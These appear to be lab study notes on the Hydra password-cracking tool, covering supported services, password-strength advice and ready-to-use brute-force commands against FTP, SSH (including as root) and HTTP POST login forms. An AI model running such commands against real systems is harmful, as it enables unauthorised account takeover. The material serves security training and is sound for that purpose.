# 🔐 TASK 1: What is Hydra?

* **Hydra** is a **brute-force online password cracking program**.
* It is used to test/guess passwords for different login services.
* Hydra can take a **list of passwords** and automatically try them one by one.
* This makes password guessing much faster than doing it manually.

### 🔨 Services Hydra can target

Hydra supports many protocols/services such as:

```text
SSH
FTP
HTTP
HTTPS
RDP
SMB
SMTP
SNMP
MySQL
Telnet
VNC
LDAP
IMAP
POP3
```

and many others.

---

## 💥 Brute Force

Suppose a login has:

```text
Username: admin
Password: ?
```

Instead of manually trying passwords, Hydra can go through a password list and find the correct password.

```text
Password List
     ↓
  Hydra
     ↓
Try Passwords
     ↓
Correct Password?
     ↓
Login ✅
```

---

## 🔑 Importance of Strong Passwords

A weak/common password is easier to guess.

A strong password should:

* Be **more than 8 characters**
* Use **uppercase + lowercase letters**
* Contain **numbers**
* Contain **special characters**
* Avoid common/default passwords

### ⚠️ Default Credentials

Some applications and devices may use easy default credentials like:

```text
admin : password
```

These should be changed immediately, especially on devices such as **CCTV cameras and web frameworks**.

### 🧠 Key Point

> **Strong and unique passwords make brute-force attacks much harder.**

# ⚔️ Hydra Commands

The Hydra command depends on the **service/protocol** being attacked.

### FTP Example

If the username is `user` and the password list is `passlist.txt`:

```bash
hydra -l user -P passlist.txt ftp://MACHINE_IP
```

---

# 🔐 SSH

Basic Hydra command for SSH:

```bash
hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh
```

### Options

| Option | Description                   |
| ------ | ----------------------------- |
| `-l`   | Specifies the SSH username    |
| `-P`   | Specifies a list of passwords |
| `-t`   | Sets the number of threads    |

### Example

```bash
hydra -l root -P passwords.txt MACHINE_IP -t 4 ssh
```

This means:

1. `root` is used as the SSH username.
2. Passwords are taken from `passwords.txt`.
3. **4 threads** run in parallel.

---

# 🌐 POST Web Form

Hydra can also brute-force **web login forms**.

Before using Hydra, you need to know whether the form uses **GET or POST**.

You can check this using:

* Browser **Developer Tools → Network tab**
* Website **source code**

### Basic Command

```bash
sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"
```

### Options

| Option                | Description                          |
| --------------------- | ------------------------------------ |
| `-l`                  | Username for web form login          |
| `-P`                  | Password list                        |
| `http-post-form`      | Specifies that the form uses POST    |
| `<path>`              | Login page path, e.g. `login.php`    |
| `<login_credentials>` | Username and password fields         |
| `<invalid_response>`  | Response text shown when login fails |
| `-V`                  | Shows every attempt                  |

---

# 🧪 POST Form Example

```bash
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

### Meaning

1. `/` → Login page is the main IP address.
2. `username` → Username form field.
3. `^USER^` → Replaced by the specified username.
4. `password` → Password form field.
5. `^PASS^` → Replaced by passwords from the wordlist.
6. `F=incorrect` → `incorrect` appears when login fails.
7. `-V` → Shows the attempts.

---

# 🔌 Non-Default Port

If the web server uses a **non-default port**, specify it using:

```bash
-s <port>
```

Example:

```bash
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -s <port> -V
```
